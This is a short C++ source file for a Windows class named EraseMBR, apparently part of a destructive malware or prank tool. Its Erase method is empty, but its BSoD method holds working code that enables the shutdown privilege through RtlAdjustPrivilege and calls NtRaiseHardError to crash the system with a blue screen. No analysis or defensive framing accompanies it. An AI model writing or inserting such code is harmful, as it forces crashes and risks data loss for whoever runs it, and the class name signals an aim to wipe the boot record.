#include "erasembr.h"
#include "stdnt.h"

#include <windows.h>

void EraseMBR::Erase(void) {
	
}

void EraseMBR::BSoD(void) {
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
}